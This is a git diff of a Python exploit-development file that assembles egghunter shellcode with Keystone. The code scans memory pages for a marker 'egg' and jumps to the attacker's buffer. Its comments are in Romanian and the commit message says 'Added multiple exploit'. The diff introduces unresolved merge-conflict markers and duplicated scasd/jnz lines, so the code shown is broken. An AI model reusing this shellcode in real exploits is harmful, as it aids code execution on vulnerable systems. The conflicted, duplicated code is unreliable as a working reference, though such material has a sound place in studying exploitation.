@@ -2,6 +2,10 @@ from keystone import *
 import utils
 
 CODE = (
+<<<<<<< HEAD
+=======
+    "xor edx, edx ;"
+>>>>>>> e3efdfd (Added multiple exploit)
     # Folosim registrul edx ca un contor de pagini de memorie
     " loop_inc_page: "
         # Mergem la ultima adresa din pagina de memorie
@@ -35,10 +39,18 @@ CODE = (
         " scasd ;"
         # Nu am gasit o potrivire, crestem contorul de memorie cu 1
         " jnz loop_inc_one ;"
+<<<<<<< HEAD
         # Prima parte a "egg-ului" a fost detectata, verificam partea a doua
         " scasd ;"
         # Nu am gasit o potrivire completa, doar jumatate de "egg"
         " jnz loop_inc_one ;"
+=======
+        # Comparam eax cu doubleword-ul de la edi si setam flag-urile
+        " scasd ;"
+        # Nu am gasit o potrivire, crestem contorul de memorie cu 1
+        " jnz loop_inc_one ;"
+        # Prima parte a "egg-ului" a fost detectata, verificam partea a doua
+>>>>>>> e3efdfd (Added multiple exploit)
     " matched: "
         # Registrul edi pointeaza la primul byte din buffer-ul nostru, putem face salt acolo
         " jmp edi ;"
